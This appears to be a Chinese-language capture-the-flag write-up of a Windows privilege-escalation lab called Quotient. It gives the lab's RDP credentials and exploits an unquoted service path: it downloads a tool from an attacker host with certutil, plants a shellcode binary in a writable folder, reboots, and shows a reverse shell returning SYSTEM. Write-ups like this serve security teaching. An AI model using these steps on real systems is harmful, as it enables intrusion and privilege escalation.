# Quotient

语法很重要。不相信我？看看当你忘记标点符号时会发生什么。

使用以下凭据使用 RDP 访问计算机：

Username: sage

Password: gr33ntHEphgK2&V

请等待 4 到 5 分钟，以便 VM 启动。

---

应该是关于windows纯提权的点

那就直接登rdp进去看看

把必要的工具传进去：

    certutil -urlcache -split -f http://10.14.39.48:8000/accesschk.exe

WinPEAS也丢进去

    sc qc "Development Service"

    C:\Program Files\Development Files\Devservice Files\Service.exe

该服务BinaryPath未被引号包裹

    accesschk -w "C:\Program Files\Development Files\"

    RW BUILTIN\Users

可以看到有权限写入该文件夹

生成shellcode并将名字修改成Devservice，移动到：

    copy Devservice.exe "C:\Program Files\Development Files\"

由于我们没权限restart该服务，我们可以选择重启系统以达到目的：

    shutdown -r -t 0

重启前先开启netcat侦听

系统启动后，我们将能getshell

<pre>Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.241.81.
Ncat: Connection from 10.10.241.81:49670.
Microsoft Windows [Version 10.0.17763.3165]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system
</pre>
